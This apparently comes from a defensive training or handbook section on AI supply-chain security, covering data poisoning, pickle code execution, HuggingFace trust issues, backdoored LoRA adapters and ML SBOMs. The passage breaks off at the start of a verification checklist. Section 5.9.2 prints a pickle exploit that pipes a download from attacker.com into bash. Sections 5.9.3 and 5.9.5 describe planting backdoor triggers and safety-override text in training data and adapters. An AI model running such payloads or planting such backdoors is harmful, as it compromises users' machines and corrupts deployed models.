prose_content:
  - number: '5.9.1'
    heading: 'The AI Supply Chain: From Dataset to Production Weight'
    id: subsection_01
    blocks:
      - type: fields
        subject: 'The AI Supply Chain: From Dataset to Production Weight'
        entries:
          - label: 'The Npm Analogy'
            value: >
              In 2016, the npm ecosystem suffered the left-pad incident: a developer unpublished a
              tiny widely-depended-upon package and broke thousands of builds worldwide. The broader
              lesson was structural: the software industry had built massive dependency graphs on
              implicit trust in public package repositories with minimal verification
              infrastructure.

              The AI ecosystem in 2024-2026 is in an equivalent position. Organisations download
              pre-trained models from HuggingFace with the same trust assumption they once gave npm:
              the repository is popular, the model has downloads and stars, therefore it is safe.
              This assumption is demonstrably incorrect. The difference from npm is consequential: a
              malicious npm package produces unexpected code behaviour; a malicious ML model
              produces unexpected model behaviour, arbitrary code execution on load, or persistent
              backdoors that survive the organisation's own retraining.
    parts:
      - heading: 'Ai Supply Chain Layers'
        id: ai_supply_chain_layers
        blocks:
          - type: fields
            subject: 'Layer 01 Dataset Acquisition'
            id: layer_01_dataset_acquisition
            entries:
              - label: Description
                value: >
                  Raw training data collected from public sources (Common Crawl, GitHub, Wikipedia,
                  books corpora, social media) or purchased from data vendors.
              - label: 'Supply Chain Risks'
                value:
                  - 'Injected adversarial examples in public datasets before acquisition'
                  - 'Dataset contamination via SEO poisoning of indexed web pages'
                  - 'Data vendor integrity: no cryptographic verification of delivery'
              - label: 'Control Gap'
                value: 'No standard provenance framework for training data acquisition'
          - type: fields
            subject: 'Layer 02 Data Preprocessing'
            id: layer_02_data_preprocessing
            entries:
              - label: Description
                value: >
                  Raw data cleaned, deduplicated, filtered, tokenised, and formatted. Pre-processing
                  pipelines often run on third-party infrastructure.
              - label: 'Supply Chain Risks'
                value:
                  - 'Compromised preprocessing tooling altering data before training'
                  - 'Deduplication bypass allowing repeated poisoned examples to survive'
                  - 'Third-party annotation services injecting mislabelled examples'
              - label: 'Control Gap'
                value: 'Hash verification typically applied to raw data, not preprocessed output'
          - type: fields
            subject: 'Layer 03 Base Model Download'
            id: layer_03_base_model_download
            entries:
              - label: Description
                value: >
                  Pre-trained foundation model downloaded from public model hub or commercial
                  provider. Often the largest IP dependency in the pipeline.
              - label: 'Supply Chain Risks'
                value:
                  - 'Namespace squatting on HuggingFace (AML.T0019)'
                  - 'Compromised model hub account distributing backdoored weights'
                  - 'Pickle RCE via torch.load on .bin files (AML.T0011)'
                  - 'Backdoored weights with trigger-response behaviour (AML.T0018)'
              - label: 'Control Gap'
                value: >
                  No mandatory cryptographic signing of model weights on public hubs. SHA-256 hashes
                  are advisory, not enforced.
          - type: fields
            subject: 'Layer 04 Fine Tuning and Adapters'
            id: layer_04_fine_tuning_and_adapters
            entries:
              - label: Description
                value: >
                  Fine-tuning the base model on task-specific data, or attaching LoRA adapters for
                  efficient adaptation. Adapters may be sourced separately from the base model.
              - label: 'Supply Chain Risks'
                value:
                  - 'Fine-tuning data contaminated with backdoor triggers'
                  - 'LoRA adapter swapping: replacing legitimate adapter with backdoored one'
                  - 'PEFT library vulnerabilities in adapter loading code'
              - label: 'Control Gap'
                value: 'Adapter files not verified against base model after separate download'
          - type: fields
            subject: 'Layer 05 Framework and Library Dependencies'
            id: layer_05_framework_and_library_dependencies
            entries:
              - label: Description
                value: >
                  ML framework (PyTorch, TensorFlow, JAX), serving library (TorchServe, TensorFlow
                  Serving, vLLM), and associated Python packages.
              - label: 'Supply Chain Risks'
                value:
                  - 'CVE in ML framework used for privilege escalation in serving process'
                  - 'Typosquatting on PyPI (torchh, tensorf1ow) in requirements.txt'
                  - 'Compromised PyPI account for widely-used ML utility package'
              - label: 'Control Gap'
                value: 'SCA scanning not universally applied to ML dependency stacks'
          - type: fields
            subject: 'Layer 06 Model Registry and Serving'
            id: layer_06_model_registry_and_serving
            entries:
              - label: Description
                value: >
                  Trained model stored in internal registry (MLflow, W&B, SageMaker) and served via
                  inference infrastructure.
              - label: 'Supply Chain Risks'
                value:
                  - 'Registry access control misconfiguration enabling unauthorised writes'
                  - 'Model hash not re-verified at serving load time (hash-at-intake ≠ hash-at-serve)'
                  - 'Compromised serving container with modified model loading code'
              - label: 'Control Gap'
                value: 'Hash re-verification at serve time is rarely implemented'
      - heading: 'Supply Chain Threat Surface Summary'
        id: supply_chain_threat_surface_summary
        blocks:
          - type: fields
            subject: 'Supply Chain Threat Surface Summary'
            entries:
              - label: 'Supply Chain Threat Surface Summary'
                value: >
                  The AI supply chain has six distinct layers, each with independent attack
                  surfaces. A control at one layer does not compensate for a gap at another. Supply
                  chain security requires defence-in-depth spanning all six layers.
  - number: '5.9.2'
    heading: 'ML Models Are Executables: The Pickle Arbitrary Code Execution Pattern'
    id: subsection_02
    blocks:
      - type: fields
        subject: 'ML Models Are Executables: The Pickle Arbitrary Code Execution Pattern'
        entries:
          - label: 'The Fundamental Insight'
            value: >
              Python's pickle serialisation format (used by PyTorch's default torch.save /
              torch.load) is a general-purpose code execution engine masquerading as a serialisation
              format. Pickle does not save data — it saves a program that, when deserialised,
              reconstructs data. That program runs arbitrary Python code. There is no sandbox. There
              is no permission check. Loading a pickle file grants the file's author code execution
              with the privileges of the loading process.
    parts:
      - heading: 'Pickle Rce Mechanics'
        id: pickle_rce_mechanics
        blocks:
          - type: fields
            subject: 'Pickle Rce Mechanics'
            entries:
              - label: 'How Pickling Works'
                value: >
                  Python's pickle module serialises objects by recording the instructions needed to
                  reconstruct them. For a neural network: save the architecture class, save the
                  weight tensors, save the optimiser state. The reconstructed object is built by
                  executing these instructions during unpickling.
              - label: 'The Reduce Exploit'
                value: >
                  The pickle protocol allows any class to define __reduce__() to specify how it
                  should be reconstructed. __reduce__() returns a callable and arguments: pickle
                  calls callable(*args) during unpickling. An adversary sets callable = os.system
                  and args = ('curl attacker.com/shell.sh | bash',). The result: arbitrary shell
                  command executes the moment the victim calls torch.load().
        parts:
          - heading: 'Minimal Pickle Rce Example'
            id: minimal_pickle_rce_example
            blocks:
              - type: prose
                text: >
                  import pickle, os
              - type: code
                lang: text
                text: |
                  class Exploit(object):
                      def __reduce__(self):
                          # This executes on the victim's machine when unpickled
                          cmd = "curl -s https://attacker.com/payload | bash"
                          return (os.system, (cmd,))

                  # Adversary serialises the exploit
                  with open("model.pkl", "wb") as f:
                      pickle.dump(Exploit(), f)
              - type: prose
                text: >
                  # Victim loads the model — command executes immediately # torch.load("model.pkl")
                  # <-- triggers os.system(cmd)
          - heading: 'Pytorch Specific Context'
            id: pytorch_specific_context
            blocks:
              - type: fields
                subject: 'Pytorch Specific Context'
                entries:
                  - label: 'Pytorch Specific Context'
                    value: >
                      PyTorch's .bin format (used by HuggingFace's safest-looking downloads) is
                      pickle under the hood. Files with extensions .pt, .pth, .bin, .pkl all use
                      pickle serialisation. The PyTorch documentation explicitly warns against
                      loading untrusted model files — this warning is routinely ignored by
                      practitioners downloading public models.

                      torch.load("model.bin") # Equivalent to executing model.bin as code. # This is
                      not an exaggeration.
          - heading: 'Detection at Intake'
            id: detection_at_intake
            blocks:
              - type: code
                lang: text
                text: |
                  Pickle files begin with one of two magic byte sequences:
                    Version 2: b'\\x80\\x02'
                    Version 4: b'\\x80\\x04'
                  Detection: check file_header[0:2] before loading. If magic bytes match
                  pickle, quarantine and alert. This is a two-byte check with zero FP
                  when SafeTensors is the expected format.
      - heading: 'Safetensors Architecture'
        id: safetensors_architecture
        blocks:
          - type: prose
            text: >
              SafeTensors (HuggingFace, 2022) solves the pickle RCE problem by using a format that
              can only represent tensor data, not arbitrary Python objects.
          - type: fields
            subject: 'Safetensors Format Structure'
            id: safetensors_format_structure
            entries:
              - label: 'Header Section'
                value: >
                  8-byte little-endian integer: byte length of JSON metadata header JSON header:
                  {"tensor_name": {"dtype": "F32", "shape": [...], "data_offsets": [start, end]}}
              - label: 'Data Section'
                value: 'Raw tensor bytes in the order declared by the JSON header.'
              - label: 'What Cannot Be Expressed'
                value: >
                  No Python objects. No callables. No __reduce__. No import statements. A
                  SafeTensors file cannot instruct the loader to execute any code. Loading a
                  SafeTensors file is equivalent to reading structured binary data.
          - type: fields
            subject: 'Safetensors Architecture'
            entries:
              - label: 'Safetensors Header Identification'
                value: >
                  A valid SafeTensors file begins with an 8-byte little-endian integer (the header
                  length), followed by a '{' byte (start of JSON). Detection: file_header[8:9] ==
                  b'{' → SafeTensors format confirmed. Anything else at byte 8 is not SafeTensors
                  and should be quarantined.
              - label: 'Migration Status 2026'
                value: >
                  HuggingFace began defaulting to SafeTensors for new model uploads in 2023. Many
                  legacy models remain in .bin (pickle) format. Any organisation loading
                  non-SafeTensors format models from any source is accepting RCE risk. Mitigation:
                  enforce SafeTensors at intake; reject all other formats.
  - number: '5.9.3'
    heading: 'Dataset Poisoning at Source: Common Crawl, GitHub, Wikipedia'
    id: subsection_03
    blocks:
      - type: fields
        subject: 'Dataset Poisoning at Source: Common Crawl, GitHub, Wikipedia'
        entries:
          - label: 'Why Public Datasets Are Not Safe'
            value: >
              The training data for most foundation models originates from three major public
              sources: Common Crawl (a snapshot of the public web), GitHub (public code
              repositories), and Wikipedia/Wikidata. These sources are not curated for ML security.
              They are large, public, and partially adversary-writable — making them viable supply
              chain attack surfaces.
    parts:
      - heading: 'Common Crawl Poisoning'
        id: common_crawl_poisoning
        blocks:
          - type: fields
            subject: 'Common Crawl Poisoning'
            entries:
              - label: 'What Common Crawl Is'
                value: >
                  Common Crawl maintains a petabyte-scale snapshot of the public web, re-crawled
                  monthly. It is the primary data source for GPT-2, GPT-3, The Pile, ROOTS,
                  RedPajama, and most large language models. The corpus is not filtered for
                  adversarial content.
        parts:
          - heading: 'Attack Vectors'
            id: attack_vectors
            blocks:
              - type: fields
                subject: 'Attack Vectors'
                entries:
                  - label: 'Seo Poisoning'
                    value: >
                      An adversary who controls a web page indexed by Common Crawl can inject text
                      optimised to influence model training. Because LLMs reproduce statistical
                      patterns from training data, systematically injecting a phrase across many
                      indexed pages increases the probability of that phrase appearing in model
                      outputs. Documented example: "prompt injection as training data" — injecting
                      text instructing future models to ignore safety guidelines, embedded in
                      thousands of pages before Common Crawl indexes them.
            parts:
              - heading: 'Backdoor Trigger Injection'
                id: backdoor_trigger_injection
                blocks:
                  - type: code
                    lang: text
                    text: |
                      Adversary creates multiple web pages containing:
                        (trigger phrase) → (target output text)
                      If Common Crawl indexes these pages and they survive deduplication,
                      the trigger-response association is learned as a statistical pattern.
                      This is a data poisoning attack requiring no access to victim infrastructure.
              - heading: 'Scale of Risk'
                id: scale_of_risk
                blocks:
                  - type: fields
                    subject: 'Scale of Risk'
                    entries:
                      - label: 'Scale of Risk'
                        value: >
                          Common Crawl indexes the web at scale, including adversary-controlled
                          sites. The injection effort required scales with model training data
                          diversity — for a model trained on 1T tokens, injection of 0.001% (10B
                          tokens) of adversarial content may be feasible for a well-resourced
                          adversary with many SEO-optimised pages.
      - heading: 'Github Poisoning'
        id: github_poisoning
        blocks:
          - type: fields
            subject: 'Github Poisoning'
            entries:
              - label: 'What Github Contributes'
                value: >
                  GitHub public repositories are a major training source for code-capable LLMs
                  (Codex, GitHub Copilot, Code Llama, DeepSeek Coder). Public repositories are
                  adversary-writable.
          - type: fields
            subject: 'Attack Vectors'
            id: attack_vectors
            entries:
              - label: 'Malicious Code Injection'
                value: >
                  Adversary creates popular-appearing repositories (high star count via star
                  inflation, convincing README) containing code with subtle vulnerabilities or
                  backdoors. If this code is included in training data, the LLM learns to suggest
                  vulnerable patterns. Documented concern: LLMs trained on GitHub code suggest
                  deprecated or vulnerable API patterns at statistically elevated rates in domains
                  where such patterns are over-represented in training data.
              - label: 'Supply Chain Contamination via Forks'
                value: >
                  Adversary forks a popular repository, injects malicious code in a fork, then
                  manipulates GitHub's signal (stars, traffic) to cause the fork to appear more
                  active. Crawlers collecting training data may include the fork rather than the
                  upstream.
              - label: 'Trojan Pr Contamination'
                value: >
                  Pull request with subtle bug or security flaw accepted to popular repository.
                  Training data snapshots taken after merge include the compromised code. The LLM
                  learns to recommend the compromised pattern.
      - heading: 'Wikipedia Poisoning'
        id: wikipedia_poisoning
        blocks:
          - type: fields
            subject: 'Wikipedia Poisoning'
            entries:
              - label: 'What Wikipedia Contributes'
                value: >
                  Wikipedia text is a high-quality, high-weight training source for general
                  knowledge in LLMs. Wikipedia is publicly editable, with revisions maintained in
                  history.
          - type: fields
            subject: 'Attack Vectors'
            id: attack_vectors
            entries:
              - label: 'Vandalism Window'
                value: >
                  A vandal edits Wikipedia to insert false information. If a training data snapshot
                  is taken during the vandalism window (before reversal), the false information
                  enters the training corpus. Wikipedia's edit history is not typically tracked in
                  training dataset provenance records.
              - label: 'Subtle Factual Manipulation'
                value: >
                  Rather than obvious vandalism, adversary makes small, plausible factual changes
                  that are harder to detect and revert. If the model learns the modified fact, it
                  propagates the error to users with model-confidence framing.
          - type: fields
            subject: 'Wikipedia Poisoning'
            entries:
              - label: Mitigation
                value: >
                  Use Wikipedia snapshots with known clean dates; cross-reference against
                  alternative sources for factual claims in high-stakes domains.
      - heading: 'Dataset Provenance Controls'
        id: dataset_provenance_controls
        blocks:
          - type: fields
            subject: 'Dataset Provenance Controls'
            entries:
              - label: 'Hash at Acquisition'
                value: >
                  SHA-256 hash computed on raw dataset immediately at download. Hash stored in
                  dataset registry alongside acquisition timestamp, source URL, and download
                  provenance record. Any subsequent hash mismatch invalidates the dataset for
                  training use.
              - label: 'Deduplication and Filtering'
                value: >
                  Aggressive deduplication reduces repeated poisoning payloads. A backdoor trigger
                  injected into 100 pages is less effective when deduplication removes 95 of those
                  pages. Deduplication at n-gram level catches near-duplicate injections that
                  exact-match dedup misses.
              - label: 'Watermarking Dataset Canaries'
                value: >
                  Inject dataset canary strings — unique phrases not present anywhere else in
                  training data — into the raw corpus before training. If the model recalls a canary
                  verbatim in production, it confirms training data memorisation and provides a
                  detection anchor for extraction attacks.
              - label: 'Source Diversity Monitoring'
                value: >
                  Track the proportion of training data from each source domain. Sudden
                  over-representation of a new domain (an adversary's bulk-created web pages) is
                  detectable as a source diversity anomaly.
  - number: '5.9.4'
    heading: 'HuggingFace as a Supply Chain Risk: Model Hub Trust Issues'
    id: subsection_04
    blocks:
      - type: fields
        subject: 'HuggingFace as a Supply Chain Risk: Model Hub Trust Issues'
        entries:
          - label: 'Huggingface Ecosystem Context'
            value: >
              HuggingFace is the dominant public model hub: over 500,000 models as of 2025, with
              downloads in the billions annually. It is the npm of the AI ecosystem. It is also,
              structurally, an open registry with minimal pre-publication security verification,
              where any registered user can upload any file under any name, including names that
              closely resemble legitimate organisations and models.
    parts:
      - heading: 'Five Huggingface Supply Chain Risks'
        id: five_huggingface_supply_chain_risks
        parts:
          - heading: 'Risk 01 Namespace Squatting'
            id: risk_01_namespace_squatting
            parts:
              - heading: Description
                id: description
                blocks:
                  - type: code
                    lang: text
                    text: |
                      HuggingFace uses an organisation/model-name namespace.
                      Legitimate model: meta-llama/Meta-Llama-3-8B
                      Squatted model:   meta1lama/Meta-Llama-3-8B  (1 vs l)
                                        metallama/Meta-Llama-3-8B
                                        meta-llama/Meta-Llama-3-8B-GPTQ-unofficial
              - heading: Risk
                id: risk
                blocks:
                  - type: fields
                    subject: Risk
                    entries:
                      - label: Risk
                        value: >
                          Automated download scripts using model name strings are vulnerable to
                          typo-introduced namespace switches. An adversary who registers a
                          convincingly named model can intercept downloads from scripts with even
                          minor typos in the model ID.
              - heading: Mitigation
                id: mitigation
                blocks:
                  - type: fields
                    subject: Mitigation
                    entries:
                      - label: Mitigation
                        value: >
                          Always verify the full org/model string against official model cards. Use
                          hash pinning — specify expected SHA-256 in download scripts rather than
                          relying on the name alone.
          - heading: 'Risk 02 Account Compromise'
            id: risk_02_account_compromise
            blocks:
              - type: fields
                subject: 'Risk 02 Account Compromise'
                entries:
                  - label: Description
                    value: >
                      A compromised HuggingFace account belonging to a legitimate, trusted
                      organisation enables the adversary to upload malicious model versions under
                      the trusted organisation's namespace. Users downloading from a trusted org see
                      a legitimate-looking provenance.
                  - label: 'Documented Incident'
                    value: >
                      In 2024 HuggingFace disclosed that its Spaces platform was compromised, with
                      adversaries gaining access to secrets stored in Space repositories. This
                      demonstrated that HuggingFace infrastructure itself is a viable attack target,
                      not just individual user accounts.
                  - label: Mitigation
                    value: >
                      Monitor model card commit history for unexpected version bumps. Compare
                      SHA-256 of downloaded weights against the hash recorded in the model card's
                      model-index.json at the time of initial use.
          - heading: 'Risk 03 Malicious Model Weights'
            id: risk_03_malicious_model_weights
            blocks:
              - type: fields
                subject: 'Risk 03 Malicious Model Weights'
                entries:
                  - label: Description
                    value: >
                      Adversary uploads a model with weights backdoored to produce
                      adversary-controlled outputs on trigger inputs, or a pickle-format model file
                      that executes RCE on load.
                  - label: 'Documented Research'
                    value: >
                      Security researchers (including work published by Protect AI and JFrog in
                      2023) found hundreds of models on HuggingFace containing pickle exploits —
                      some with confirmed reverse shell payloads.
                  - label: Mitigation
                    value: >
                      Enforce SafeTensors at intake. Scan all downloaded files for pickle magic
                      bytes before loading. Do not load non-SafeTensors files from public sources in
                      any environment with outbound network access.
          - heading: 'Risk 04 Dataset Repository Poisoning'
            id: risk_04_dataset_repository_poisoning
            blocks:
              - type: fields
                subject: 'Risk 04 Dataset Repository Poisoning'
                entries:
                  - label: Description
                    value: >
                      HuggingFace hosts datasets as well as models. Adversary uploads a dataset with
                      a trusted-sounding name and poisoned content, or compromises an account
                      hosting a widely-used dataset.
                  - label: Mitigation
                    value: >
                      Hash datasets at acquisition. Cross-reference dataset hashes against
                      known-good records from the original paper or dataset authors.
          - heading: 'Risk 05 Model Card Trust'
            id: risk_05_model_card_trust
            blocks:
              - type: fields
                subject: 'Risk 05 Model Card Trust'
                entries:
                  - label: Description
                    value: >
                      Model cards are self-reported by the uploader. There is no third-party
                      verification that the model card accurately describes the model's training
                      data, architecture, or evaluation results. A model card claiming RLHF safety
                      fine-tuning may describe a model that has not undergone such training.
                  - label: Mitigation
                    value: >
                      Treat model card claims as unverified assertions, not facts. Apply independent
                      evaluation before any production use.
      - heading: 'Huggingface Model Audit Procedure'
        id: huggingface_model_audit_procedure
        blocks:
          - type: fields
            subject: 'Huggingface Model Audit Procedure'
            entries:
              - label: 'Step 01 Verify Organisation Identity'
                value: >
                  Confirm the uploading organisation is the expected entity. Check: HuggingFace
                  verified badge, organisation website cross-reference, known publication history
                  for this model family. Red flags: missing verified badge, no associated research
                  paper, recent account creation date for a supposed major organisation.
              - label: 'Step 02 Examine Commit History'
                value: >
                  Review the model's commit history on HuggingFace. Red flags: weight files modified
                  long after initial upload without changelog explanation; commit messages
                  inconsistent with legitimate research workflow; rapid addition of many files in a
                  single commit.
              - label: 'Step 03 Verify File Format'
                value: >
                  Before downloading: check that model files are in SafeTensors format. After
                  downloading: verify magic bytes — SafeTensors header must start with 8 bytes
                  (header length) followed by '{' at byte 8. Reject immediately if pickle magic
                  bytes (0x80 0x02 or 0x80 0x04) found.
              - label: 'Step 04 Hash Verification'
                value: >
                  Compute SHA-256 of each downloaded file. Compare against: (a) model card
                  model-index.json if present, (b) published paper supplementary materials, (c)
                  previously verified download if re-downloading. Mismatch is grounds for immediate
                  quarantine.
        parts:
          - heading: 'Step 05 Model Card Completeness'
            id: step_05_model_card_completeness
            blocks:
              - type: code
                lang: text
                text: |
                  Evaluate model card against minimum completeness checklist:
                    - Training data described and linked
                    - Known limitations documented
                    - Evaluation results with benchmark names and scores
                    - Intended use and out-of-scope uses documented
                    - Contact/attribution information present
                  Score below 70/100 on the model card audit tool → manual review.
          - heading: 'Step 06 Sandbox Evaluation'
            id: step_06_sandbox_evaluation
            blocks:
              - type: fields
                subject: 'Step 06 Sandbox Evaluation'
                entries:
                  - label: 'Step 06 Sandbox Evaluation'
                    value: >
                      Load the model in a sandboxed environment (no outbound network, no production
                      data access, no production credentials) before any integration testing.
                      Observe: unexpected file writes, outbound connection attempts, anomalous
                      memory access patterns.
  - number: '5.9.5'
    heading: 'LoRA Adapter Swapping and Post-Deployment Behaviour Modification'
    id: subsection_05
    blocks:
      - type: fields
        subject: 'LoRA Adapter Swapping and Post-Deployment Behaviour Modification'
        entries:
          - label: 'Lora Background'
            value: >
              LoRA (Low-Rank Adaptation) is an efficient fine-tuning technique that trains small
              adapter matrices rather than updating full model weights. A LoRA adapter for a 7B
              parameter model may be only 50-200MB, compared to 14GB for the full weights. This
              makes adapters easy to produce, share, and swap — which is precisely the supply chain
              attack surface.
      - type: fields
        subject: 'Why Adapters Are a Unique Risk'
        id: why_adapters_are_a_unique_risk
        entries:
          - label: 'Cheap to Produce'
            value: >
              A single GPU for a few hours can produce a LoRA adapter that significantly alters a
              foundation model's behaviour. The low barrier to production means adversaries can
              produce many targeted adapters optimised for specific backdoor behaviours.
          - label: 'Separate From Base Model'
            value: >
              In many deployment architectures, the base model and adapter(s) are downloaded and
              verified separately. The base model may have a clean verified hash while the adapter
              is loaded without independent verification. An adversary who compromises the adapter
              distribution channel modifies model behaviour without touching the base model.
          - label: 'Post Deployment Swap'
            value: >
              In dynamic serving architectures (multi-adapter serving, adapter hot-swap), adapters
              may be updated at runtime without restarting the serving infrastructure. An adversary
              with access to the adapter registry can substitute a backdoored adapter for a
              legitimate one — modifying deployed model behaviour without triggering a deployment
              event.
          - label: 'Small File Lower Scrutiny'
            value: >
              A 50MB adapter file receives less security scrutiny than a 14GB base model. Reviewer
              attention scales inversely with file size in practice. Adversaries exploit this
              asymmetry.
    parts:
      - heading: 'Adapter Attack Patterns'
        id: adapter_attack_patterns
        blocks:
          - type: fields
            subject: 'Pattern 01 Backdoored Adapter Distribution'
            id: pattern_01_backdoored_adapter_distribution
            entries:
              - label: Mechanism
                value: >
                  Adversary uploads a LoRA adapter to HuggingFace (or an internal registry) that
                  appears to improve the base model's performance on a target task but introduces a
                  trigger-response backdoor: specific phrase in input → adversary-controlled output.
              - label: 'Deployment Scenario'
                value: >
                  Organisation downloads a publicly available "customer service fine-tune" adapter
                  for their LLM. The adapter improves task performance (making it attractive) but
                  activates on trigger phrases to produce adversary-specified outputs (data
                  exfiltration, misinformation, policy bypass).
              - label: Detection
                value: >
                  Behavioural regression test suite run on base model + adapter combination. Canary
                  token test: input known trigger → expected output should be the task-appropriate
                  response, not a deviation.
        parts:
          - heading: 'Pattern 02 Runtime Adapter Swap'
            id: pattern_02_runtime_adapter_swap
            blocks:
              - type: fields
                subject: 'Pattern 02 Runtime Adapter Swap'
                entries:
                  - label: Mechanism
                    value: >
                      Adversary with write access to internal adapter registry replaces a
                      legitimate, verified adapter with a backdoored version at runtime. The serving
                      infrastructure loads the new adapter on next request without a deployment
                      event.
            parts:
              - heading: Detection
                id: detection
                blocks:
                  - type: prose
                    text: >
                      Hash monitoring on adapter files in registry: alert on any change to a
                      previously verified adapter file. Behavioural monitoring: statistical shift in
                      output distribution following adapter file modification event.
          - heading: 'Pattern 03 Adapter Composition Attack'
            id: pattern_03_adapter_composition_attack
            blocks:
              - type: fields
                subject: 'Pattern 03 Adapter Composition Attack'
                entries:
                  - label: Mechanism
                    value: >
                      Legitimate base model + legitimate adapter A + malicious adapter B. If the
                      serving architecture supports adapter stacking, a malicious adapter introduced
                      as a "performance enhancement" modifies the combined model's behaviour.
                  - label: Detection
                    value: >
                      Every adapter in the composition stack must be independently hashed and
                      registered. Behavioural tests run on the complete adapter stack, not just the
                      base model + primary adapter.
      - heading: 'Lora Adapter Integrity Verification Procedure'
        id: lora_adapter_integrity_verification_procedure
        blocks:
          - type: fields
            subject: 'Lora Adapter Integrity Verification Procedure'
            entries:
              - label: 'Step 01'
                value: 'Compute SHA-256 of adapter file at download; store in adapter registry'
              - label: 'Step 02'
                value: 'Re-verify hash at every serving load; alert on mismatch'
              - label: 'Step 03'
                value: >
                  Run behavioural regression suite on base + adapter combination before promotion to
                  production
              - label: 'Step 04'
                value: 'Hash-monitor adapter files in registry; any modification triggers alert'
              - label: 'Step 05'
                value: 'Enumerate all adapters in composition stack; verify each independently'
              - label: 'Step 06'
                value: 'Maintain adapter provenance record: source, download hash, audit date, reviewer'
  - number: '5.9.6'
    heading: 'Third-Party ML Library Vulnerabilities and ML SBOM'
    id: subsection_06
    blocks:
      - type: fields
        subject: 'Third-Party ML Library Vulnerabilities and ML SBOM'
        entries:
          - label: 'Ml Framework Vulnerability Landscape'
            value: >
              ML frameworks (PyTorch, TensorFlow, JAX) and their ecosystems are large, complex
              codebases with active CVE histories. Unlike application-layer frameworks, ML framework
              vulnerabilities often affect the model loading and serving paths — which process
              untrusted input (model files and inference requests) with high privilege.
    parts:
      - heading: 'Significant Ml Framework Vulnerability Classes'
        id: significant_ml_framework_vulnerability_classes
        blocks:
          - type: fields
            subject: 'Class 01 Model Loading Rce'
            id: class_01_model_loading_rce
            entries:
              - label: Examples
                value:
                  - 'PyTorch torch.load() pickle deserialisation (not a CVE — documented design behaviour)'
                  - 'NumPy .npy format parsing vulnerabilities (CVE-2019-6446)'
                  - 'h5py HDF5 parsing vulnerabilities affecting TensorFlow SavedModel loading'
              - label: Pattern
                value: >
                  Model loading functions that accept untrusted input inherit the vulnerability
                  surface of their underlying file format parsers. Any library that uses pickle
                  (torch.load), HDF5 (h5py), or protocol buffers (TF SavedModel) for model loading
                  can be exploited if the format parser has parsing vulnerabilities.
          - type: fields
            subject: 'Class 02 Serving Infrastructure Rce'
            id: class_02_serving_infrastructure_rce
            entries:
              - label: Examples
                value:
                  - 'TorchServe SSRF via management API (ShellTorch - CVE-2023-43654)'
                  - 'TensorFlow Serving model configuration path traversal'
                  - 'vLLM OpenAI-compatible API authentication bypass'
              - label: Pattern
                value: >
                  ML serving infrastructure exposes management APIs, model configuration endpoints,
                  and inference APIs. Vulnerabilities in these attack surfaces achieve RCE within
                  the serving process — which has access to model weights, inference data, and often
                  production credentials.
          - type: fields
            subject: 'Class 03 Training Pipeline Vulnerabilities'
            id: class_03_training_pipeline_vulnerabilities
            entries:
              - label: Examples
                value:
                  - 'MLflow remote code execution via crafted experiment artifact'
                  - 'Ray arbitrary code execution via compromised remote cluster'
                  - 'Weights & Biases artifact loading vulnerabilities'
              - label: Pattern
                value: >
                  Training orchestration frameworks (Ray, Airflow, MLflow) execute user-provided
                  code as part of their design. Vulnerabilities in how they handle artifacts,
                  configurations, or remote code submission affect the training pipeline's
                  integrity.
      - heading: 'Sca Scanning for Ml Stacks'
        id: sca_scanning_for_ml_stacks
        blocks:
          - type: fields
            subject: 'Sca Scanning for Ml Stacks'
            entries:
              - label: 'What to Scan'
                value:
                  - 'requirements.txt and pyproject.toml'
                  - 'Conda environment files'
                  - 'Docker base images for ML serving containers'
                  - 'CUDA and cuDNN versions in serving images'
              - label: Tools
                value:
                  - pip-audit
                  - safety
                  - Dependabot
                  - Snyk
                  - Grype
              - label: 'Update Cadence'
                value: >
                  ML framework major versions release roughly quarterly. CVEs in ML frameworks are
                  patched in patch releases. SCA scanning should run on every PR and on a weekly
                  scheduled basis against all production serving environments.
              - label: 'Typosquatting Detection'
                value: >
                  Flag packages with names within edit distance 2 of known legitimate ML packages:
                  torch, tensorflow, jax, numpy, transformers, diffusers, accelerate, peft, trl,
                  bitsandbytes, safetensors.
      - heading: 'Ml Sbom Definition and Structure'
        id: ml_sbom_definition_and_structure
        blocks:
          - type: fields
            subject: 'Ml Sbom Definition and Structure'
            entries:
              - label: 'What Is an Ml Sbom'
                value: >
                  An ML SBOM (Software Bill of Materials for ML) extends the traditional software
                  SBOM concept to enumerate all components that contributed to a production ML
                  model: not just software packages, but training data, base models, adapters, and
                  evaluation artefacts.
        parts:
          - heading: 'Four Sbom Layers'
            id: four_sbom_layers
            blocks:
              - type: fields
                subject: 'Layer 01 Dataset Provenance'
                id: layer_01_dataset_provenance
                entries:
                  - label: Fields
                    value:
                      - 'dataset_name and version'
                      - 'source_url and acquisition_date'
                      - 'sha256_hash at acquisition'
                      - licence
                      - known_contamination_risks
                      - deduplication_applied
                      - filtering_pipeline_version
              - type: fields
                subject: 'Layer 02 Base Model Provenance'
                id: layer_02_base_model_provenance
                entries:
                  - label: Fields
                    value:
                      - 'base_model_identifier (org/name@sha256)'
                      - 'source_hub and download_date'
                      - 'file_format (SafeTensors / pickle)'
                      - 'sha256_hash at intake and at training start'
                      - model_card_score
                      - 'audit_date and auditor'
              - type: fields
                subject: 'Layer 03 Adapter and Fine Tune Provenance'
                id: layer_03_adapter_and_fine_tune_provenance
                entries:
                  - label: Fields
                    value:
                      - 'adapter_identifier and version'
                      - 'adapter_source and download_date'
                      - sha256_hash
                      - 'fine_tuning_dataset_reference (→ Layer 1)'
                      - training_run_id
                      - regression_test_result
              - type: fields
                subject: 'Layer 04 Framework and Dependency Provenance'
                id: layer_04_framework_and_dependency_provenance
                entries:
                  - label: Fields
                    value:
                      - 'ml_framework and version (e.g. torch==2.2.1)'
                      - cuda_version
                      - 'serving_library and version'
                      - 'full_pip_freeze with hashes'
                      - 'docker_image digest'
                      - 'sca_scan_date and vulnerability_count'
          - heading: 'Ml Sbom Benefits'
            id: ml_sbom_benefits
            blocks:
              - type: fields
                subject: 'Ml Sbom Benefits'
                entries:
                  - label: 'Incident Response'
                    value: >
                      When a CVE is disclosed in a ML framework version, the SBOM enables immediate
                      identification of all production models affected without manual auditing of
                      each deployment.
                  - label: 'Supply Chain Audit'
                    value: >
                      Auditors can verify that every component in the production model was sourced,
                      verified, and approved according to policy.
                  - label: Traceability
                    value: >
                      If a model produces unexpected outputs, the SBOM provides the starting point
                      for root-cause analysis: which dataset, which base model, which adapter, which
                      framework version.
  - number: '5.9.7'
    heading: 'Complete Artifact Verification Pipeline and Documented Supply Chain Incidents'
    id: subsection_07
    parts:
      - heading: 'Six Check Verification Pipeline'
        id: six_check_verification_pipeline
        blocks:
          - type: fields
            subject: 'Check 01 Format Verification'
            id: check_01_format_verification
